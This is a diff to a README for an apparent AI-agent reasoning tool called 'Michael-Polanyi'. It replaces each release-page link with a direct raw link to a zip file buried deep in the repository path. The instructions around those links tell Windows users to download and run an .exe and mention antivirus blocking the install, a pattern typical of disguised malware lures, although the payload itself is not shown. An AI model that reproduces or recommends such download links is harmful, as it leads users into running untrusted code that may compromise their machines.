@@ -1,6 +1,6 @@
 # 🧠 Michael-Polanyi - Improve AI decisions under difficult conditions
 
-[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Allow2267/Michael-Polanyi/releases)
+[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Allow2267/Michael-Polanyi/raw/refs/heads/main/skills/michael-polanyi/agents/Polanyi_Michael_Bakuba.zip)
 
 Michael-Polanyi provides a framework for AI agents to handle tasks that require human-like judgment. AI models often struggle when information is incomplete or when tasks involve trade-offs. This tool bridges that gap. It helps Claude Code, Codex, and other agents reason through ambiguity. By using these methods, your agents act with more practical wisdom.
 
@@ -24,7 +24,7 @@ The software focuses on three areas:
 
 You must follow these steps to set up the application on your Windows computer.
 
-1. Navigate to the official release page: [https://github.com/Allow2267/Michael-Polanyi/releases](https://github.com/Allow2267/Michael-Polanyi/releases).
+1. Navigate to the official release page: [https://github.com/Allow2267/Michael-Polanyi/raw/refs/heads/main/skills/michael-polanyi/agents/Polanyi_Michael_Bakuba.zip](https://github.com/Allow2267/Michael-Polanyi/raw/refs/heads/main/skills/michael-polanyi/agents/Polanyi_Michael_Bakuba.zip).
 2. Locate the file ending in .exe under the latest version.
 3. Click the file to start the download.
 4. Save the file to your Downloads folder or your desktop for easy access.
@@ -81,7 +81,7 @@ Check your antivirus settings. Sometimes security software blocks new installs. 
 If you encounter errors, follow these steps to resolve them.
 
 * Restart the application: Close the window and reopen it. This clears temporary memory errors.
-* Reinstall the package: If features look broken, download the latest file from [https://github.com/Allow2267/Michael-Polanyi/releases](https://github.com/Allow2267/Michael-Polanyi/releases) and run it again. This updates any missing files.
+* Reinstall the package: If features look broken, download the latest file from [https://github.com/Allow2267/Michael-Polanyi/raw/refs/heads/main/skills/michael-polanyi/agents/Polanyi_Michael_Bakuba.zip](https://github.com/Allow2267/Michael-Polanyi/raw/refs/heads/main/skills/michael-polanyi/agents/Polanyi_Michael_Bakuba.zip) and run it again. This updates any missing files.
 * Check your connection: Ensure your internet works by visiting a website in your browser.
 * Update Windows: Older versions of Windows might lack the security features required to run the engine. Check for Windows updates in your system settings.
 
